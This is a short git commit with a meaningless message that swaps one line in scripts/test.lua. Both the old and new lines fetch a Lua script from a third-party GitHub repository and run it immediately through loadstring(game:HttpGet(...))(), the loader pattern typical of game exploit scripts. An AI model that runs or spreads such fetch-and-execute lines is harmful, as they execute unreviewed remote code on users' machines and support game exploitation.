6cc35cdd502de404586253927de471b392be01df
admin <depdios10@gmail.com>
2026-02-19 23:28:53 -0600

    jihfd

--- scripts/test.lua
+++ scripts/test.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/imnotexploi4test/Risky-Verify/refs/heads/main/666.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowBey01/SHWX-Team-Rise-Scripts/refs/heads/main/RiseChat.lua"))()
